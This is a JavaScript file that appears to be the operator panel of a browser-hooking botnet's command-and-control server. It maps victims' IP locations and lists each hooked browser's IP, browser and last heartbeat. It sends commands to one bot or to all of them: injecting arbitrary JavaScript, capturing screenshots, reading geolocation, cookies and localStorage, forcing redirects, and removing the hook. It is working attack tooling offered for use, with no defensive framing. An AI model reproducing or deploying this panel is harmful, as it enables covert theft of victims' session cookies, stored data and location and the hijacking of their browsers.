var mymap = L.map('mapid').setView([0, 0], 1);
// add tile layer to the map
L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
  maxZoom: 18,
}).addTo(mymap);

var markers = [];

window.onload = function() {
  var navbarItems = document.getElementsByClassName("navbar-item");
  for (var i = 0; i < navbarItems.length; i++) {
      navbarItems[i].style.opacity = "1";
  }
}

function initMap() {
  fetch("http://127.0.0.1:5000/ip_locations")
    .then(response => response.json())
    .then(data => {
      // Clear any existing markers from the map
      clearMarkers();

      // Loop through the IP locations and create markers on the map
      data.forEach(location => {
        var marker = L.marker([location[0], location[1]]).addTo(mymap);
        markers.push(marker);
      });
    })
    .catch(error => console.error(error));
}

function clearMarkers() {
  markers.forEach(marker => {
    mymap.removeLayer(marker);
  });
  markers = [];
}

// Call the initMap function when the page has loaded
initMap();



function cst(seconds) {
  var date = new Date(seconds * 1000);
  var hours = date.getHours().toString().padStart(2, '0');
  var minutes = date.getMinutes().toString().padStart(2, '0');
  var seconds = date.getSeconds().toString().padStart(2, '0');
  var time = hours + ':' + minutes + ':' + seconds;
  return time;
}

function updateElement() {
  fetch('/bots')
    .then(response => response.json())
    .then(data => {
      // Extract all the keys from the response
      const keys = Object.keys(data);

      // Append the keys as option elements to the select element
      const select = document.querySelector('.atkinput2');
      select.innerHTML = ''; // Clear the options before adding the new ones
      for (const key of keys) {
        const option = document.createElement('option');
        option.value = key;
        option.textContent = key;
        select.appendChild(option);
      }
    })
    .catch(error => console.error(error));
}

function updateDashboard() {
  fetch('/bots')
    .then(response => response.json())
    .then(data => {
      const botList = document.querySelector('.bot-list');
      const botNames = Object.keys(data);
      
      botNames.forEach(botName => {
        let botData = data[botName];
        let botRow = document.querySelector(`.bot-list [data-bot-name="${botName}"]`);
        if (!botRow) {
          botRow = document.createElement('div');
          botRow.classList.add('row', 'bot-list__bot');
          botRow.setAttribute('data-bot-name', botName);
          botList.appendChild(botRow);
        }
        botRow.innerHTML = `
        <div class="bottfixx">
          <a href="/result/${botName}">
            <div class="bot-info">
              <div class="bot-name">${botName}</div>
              <div class="bot-ip">IP: ${botData.ip}</div>
              <div class="bot-browser">Browser: ${botData.browser}</div>
              <div class="bot-hsp">HSP: ${botData.hsp}</div>
              <div class="bot-from">From: ${botData.from}</div>
              <div class="bot-hash">Hash: ${botData.ch}</div>
              <div class="bot-last-seen">Last Seen: ${cst(botData.last_heartbeat)}</div>
            </div>
          </a>
        </div>
        `;
      });      

      // Remove any extra bot rows if there are more rows than bot names
      const botRows = document.querySelectorAll('.bot-list__bot');
      if (botRows.length > botNames.length) {
        for (let i = botNames.length; i < botRows.length; i++) {
          botRows[i].remove();
        }
      }
    })
    .catch(error => console.error(error));
    initMap();
    updateElement();
    
}

function postMessageToBot(botName, command) {
  const url = `/bot/${botName}/postmessage/${command}`;
  fetch(url)
    .then(response => {
      if (!response.ok) {
        throw new Error('Network response was not ok');
      }
      return response.text();
    })
    .then(data => {
      console.log(data);
      alert(data)
    })
    .catch(error => {
      console.error('There was a problem with the fetch operation:', error);
    });
}

function handleSelection() {
  var attackType = document.getElementById("attacktype").value;
  var computerOption = document.getElementById("computer").value;
  var attacklist = ["attack1","attack2","attack3","attack4","attack5","attack6","attack7"]
  var needinputs = ["attack1","attack6"]

  if (computerOption === "aalc") {
    if (attacklist.includes(attackType)) {
      document.getElementsByClassName("atkinput1")[0].style.display = "none";
      document.getElementsByClassName("atkinput2")[0].style.display = "none";
      if (needinputs.includes(attackType)) {
        document.getElementsByClassName("atkinput1")[0].style.display = "block";
        document.getElementsByClassName("atkinput2")[0].style.display = "none";
        if(attackType == "attack1") {
          document.getElementsByClassName("atkinput1")[0].placeholder = "Enter JS";
        } else if(attackType == "attack6") {
          document.getElementsByClassName("atkinput1")[0].placeholder = "Enter Redirect URL";
        } else if(attackType == "attack7") {
          document.getElementsByClassName("atkinput1")[0].placeholder = "Enter Bot Name";
        }
      } else {
        document.getElementsByClassName("atkinput1")[0].style.display = "none";
        document.getElementsByClassName("atkinput2")[0].style.display = "none";
      }
    }
  } else if (computerOption === "oolc") {
    if (attacklist.includes(attackType)) {
      document.getElementsByClassName("atkinput1")[0].style.display = "none";
      document.getElementsByClassName("atkinput2")[0].style.display = "none";
      if (needinputs.includes(attackType)) {
          document.getElementsByClassName("atkinput1")[0].style.display = "block";
          document.getElementsByClassName("atkinput2")[0].style.display = "block";
          document.getElementsByClassName("atkinput2")[0].placeholder = "Enter Bot Name"
          if(attackType == "attack1") {
            document.getElementsByClassName("atkinput1")[0].placeholder = "Enter JS";
          } else if(attackType == "attack6") {
            document.getElementsByClassName("atkinput1")[0].placeholder = "Enter Redirect URL";
          } else if(attackType == "attack7") {
            document.getElementsByClassName("atkinput1")[0].placeholder = "Enter Bot Name";
          }
      } else {
          document.getElementsByClassName("atkinput1")[0].style.display = "none";
          document.getElementsByClassName("atkinput2")[0].style.display = "block";
          document.getElementsByClassName("atkinput2")[0].placeholder = "Enter Bot Name"
      }
    } else {
      document.getElementsByClassName("atkinput1")[0].style.display = "none";
      document.getElementsByClassName("atkinput2")[0].style.display = "none";
    }
  } else {
    console.log("Invalid option selected");
  }
}

function checkfields() {
  var attackType = document.getElementById("attacktype").value;
  var computerOption = document.getElementById("computer").value;
  var input1 = document.getElementsByClassName("atkinput1")[0];
  var input2 = document.getElementsByClassName("atkinput2")[0];
  fetch('/bots')
    .then(response => response.json())
    .then(data => {
      const botNames = Object.keys(data);
      if (botNames.length == 0) {
        alert("No Bots");
        input1.value = "";
        input2.value = "";
        return;
      } else {
        if (computerOption === "aalc") {
          if (attackType !== "" && input1.style.display !== "none" && input1.value === "") {
            alert("Please enter a value for the first input field.");
            return;
          } else {
            if (attackType == "attack1") {
              postMessageToBot("ALL", input1.value);
            } else if (attackType == "attack2") {
              postMessageToBot("ALL", 'captureScreenshot();');
            } else if (attackType == "attack3") {
              postMessageToBot("ALL", 'geoloc();');
            } else if (attackType == "attack4") {
              postMessageToBot("ALL", 'cookies();');
            } else if (attackType == "attack5") {
              postMessageToBot("ALL", 'locals();');
            } else if (attackType == "attack6") {
              postMessageToBot("ALL", 'redirectTo("' + btoa(input1.value) + '");');
            } else if (attackType == "attack7") {
              postMessageToBot("ALL", 'remover()');
            } else {
              alert("Command Not Found")
            }
          }
        } else if (computerOption === "oolc") {
          var selectedpc = document.getElementById("atkinput2").value;
          if (selectedpc !== ""){
            if (attackType !== "") {
              if (input1.style.display !== "none" && input1.value === "") {
                alert("Please enter a value for the first input field.");
                return;
              }
              if (input2.style.display !== "none" && input2.value === "") {
                alert("Please enter a value for the second input field.");
                return;
              } else {
                if (attackType == "attack1") {
                  postMessageToBot(selectedpc, input1.value);
                } else if (attackType == "attack2") {
                  postMessageToBot(selectedpc, 'captureScreenshot();');
                } else if (attackType == "attack3") {
                  postMessageToBot(selectedpc, 'geoloc();');
                } else if (attackType == "attack4") {
                  postMessageToBot(selectedpc, 'cookies();');
                } else if (attackType == "attack5") {
                  postMessageToBot(selectedpc, 'locals();');
                } else if (attackType == "attack6") {
                  postMessageToBot(selectedpc, 'redirectTo("' + btoa(input1.value) + '");');
                } else if (attackType == "attack7") {
                  postMessageToBot(selectedpc, 'remover()');
                } else {
                  alert("Command Not Found")
                }
              }
            }
          } else {
            alert("You Have No Bots");
            return;
          }
        } else {
          console.log("Invalid option selected");
          return;
        }
        input1.value = "";
        input2.value = "";
      }
    })
}


handleSelection();
initMap();
setInterval(updateDashboard, 2000);
